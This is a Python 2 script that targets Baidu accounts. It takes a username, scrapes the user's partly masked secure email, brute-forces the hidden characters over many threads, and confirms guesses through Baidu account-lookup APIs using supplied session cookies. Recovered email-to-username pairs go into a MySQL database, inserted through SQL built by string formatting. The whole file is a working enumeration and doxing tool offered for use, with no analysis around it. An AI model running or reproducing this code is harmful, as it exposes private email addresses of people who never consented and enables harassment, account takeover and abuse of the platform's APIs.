# -*- coding: utf-8 -*-
import re
import time
import json
import MySQLdb
import requests
import threading
from urllib import quote,unquote
import Get_Name_By_Phone as get_name
import random


start_time = time.time()


def get_userid(name):
    get_id_url = 'http://tieba.baidu.com/home/main?un=%s&ie=utf-8&fr=pb' % (name)
    id_request = requests.get(get_id_url)
    id_pattern = re.compile(r'"user_id":(\d+),"homeUserName":')
    id = id_pattern.search(id_request.content).group(1)
    return id


def get_numbers(ppid):
    headers = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate, sdch',
        'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6',
        'Cache-Control':'max-age=0',
        'Connection':'keep-alive',
        'Cookie':'BAIDUID=8688C81A7043FD661AB825FB3AF8649E:FG=1;',
        'DNT':'1',
        'Host':'koubei.baidu.com',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'
    }
    get_number_url = 'http://koubei.baidu.com/home?fr=header&ppid=%s' % (ppid)
    info_request = requests.get(get_number_url, headers=headers)
    info_pattern = re.compile(r'userInfo: ({.+})')
    try:
        info = info_pattern.search(info_request.content).group(1)
    except:
        raise Exception('账号不存在')
    info_json = json.loads(info)
    try:
        mail = info_json['secureemail'].encode('utf-8')
    except:
        raise Exception('未绑定邮箱')
    return mail


def get_mid(type, mail_length):
    all_mails= ['']
    possible_words = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
    if type == 1:
        pass
    elif type == 2:
        for word in range(97, 123):
            possible_words.append(chr(word))
    #return ['865156'], possible_words
    return mid_loop(possible_words, mail_length, all_mails), possible_words


def mid_loop(possible_word, count, all_mails):
    new_mails = []
    if count == 6:
        return all_mails
    else:
        for mail in all_mails:
            for word in possible_word:
                new_mails.append(mail + word)
                #print mail + word
        return mid_loop(possible_word, count - 1, new_mails)


def get_info_by_id(uid, cookies, count):
    url = 'http://yun.baidu.com/api/user/getinfo?user_list=%%5B%%22%s%%22%%5D&need_relation=1' % uid
    info_request = requests.get(url, cookies=cookies[count])
    return info_request.content


def get_exact_mail_thread(head, mid, tail, cookies, mail_name_dist, alive, threads_list, possible_words):
    try:
        del threads_list[0]
        count = random.randint(1000, 10000)
        for i in possible_words:
                mail_tmp = '%s%s%s%s' % (head, mid, i, tail)
                print mail_tmp
                while True:
                    uid_tmp, name_tmp, count = get_name.get_info(mail_tmp, cookies, count)
                    if uid_tmp != '-1' and name_tmp != '-1':
                        break
                if uid_tmp:
                    if name_tmp is None:
                        info = get_info_by_id(uid_tmp, cookies, count)
                        info_json = json.loads(info)
                        name = info_json['records'][0]['uname']
                    else:
                        name = name_tmp
                    print name
                    mail_name_dist[name] = mail_tmp
    except:
        pass
    finally:
        del alive[0]


def get_exact_mail(name, type, cookies, threads_numbers):
    mail_name_dist = {}
    threads_list = []
    alive_list = []
    threads_count = 0
    try:
        uid = get_userid(name)
    except:
        raise Exception('账号不存在')
    try:
        mail_with_mosaic = get_numbers(uid)
    except:
        raise Exception('未绑定邮箱')
    print '%s\n' % mail_with_mosaic
    head = mail_with_mosaic[:2]
    tail_pattern = re.compile('.@.*')
    tail = tail_pattern.search(mail_with_mosaic).group(0)
    length_pattern = re.compile('\*')
    mail_length = len(length_pattern.findall(mail_with_mosaic))
    if (mail_length > 6 and type == 1) or (mail_length > 4 and type == 2):
	raise Exception('位数过长')
    #print mail_length
    #print head, tail
    mail_mid_list, possible_words = get_mid(type, mail_length)
    #print 'finished'
    for mid in mail_mid_list:
        tmp = threading.Thread(target=get_exact_mail_thread, args=(head, mid, tail, cookies, mail_name_dist, alive_list, threads_list, possible_words))
        threads_list.append(tmp)
    threads_list_bak = threads_list[:]
    count = 0
    end_time = time.time() + 99999
    while True:
        if len(alive_list) <= threads_numbers and threads_count < len(threads_list_bak):
            alive_list.append(threads_list_bak[threads_count])
            threads_list_bak[threads_count].setDaemon(True)
            threads_list_bak[threads_count].start()
            threads_count += 1
        if len(threads_list) == 0 and count == 0:
            print 'Finished'
            end_time = time.time()
            count += 1
        if time.time()-end_time >= 10:
            alive_list = []
        if len(alive_list) == 0:
            break
    return mail_name_dist


def print_mail(name, type, cookies, threads_numbers = 45):
    try:
        name_dist = get_exact_mail(name, type, cookies, threads_numbers)
    except:
        return '账号不存在或未绑定邮箱'
    try:
        conn = MySQLdb.connect(host='localhost', user='root', passwd='', db='baidu_info', port=3306)
        cur = conn.cursor()
        for key, value in name_dist.items():
            cur.execute('insert ignore into info_mail (id, mail) values ("%s", "%s")' % (quote(key.encode('utf-8')), value))
        conn.commit()
        cur.close()
        conn.close()
    except MySQLdb.Error, e:
        print "Mysql Error %d: %s" % (e.args[0], e.args[1])
    try:
        print unquote(name)
        print name_dist[unquote(name)]
        return 'id:%s mail:%s' % (unquote(name), name_dist[unquote(name)])
    except Exception, e:
        if unquote(name) not in name_dist.keys():
            conn = MySQLdb.connect(host='localhost', user='root', passwd='', db='baidu_info', port=3306)
            cur = conn.cursor()
            cur.execute('insert ignore into info_mail (id, mail) values ("%s", "null")' % quote(name.encode('utf-8')))
            conn.commit()
            cur.close()
            conn.close()
	return u'找不到 %s 的邮箱' % name

